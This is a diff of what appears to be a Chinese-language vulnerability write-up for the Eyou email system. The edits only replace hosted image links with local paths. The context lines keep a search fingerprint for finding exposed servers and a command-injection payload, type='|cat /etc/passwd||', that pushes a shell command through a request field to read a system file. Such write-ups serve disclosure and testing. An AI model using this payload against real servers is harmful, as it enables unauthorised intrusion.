@@ -22,7 +22,7 @@ body="亿邮电子邮件系统"
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091831652.png)
+![](./images/202202091831652.png)
 
 
 
@@ -42,7 +42,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 type='|cat /etc/passwd||'
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091831783.png)
+![](./images/202202091831783.png)
 
 ## 漏洞POC
 
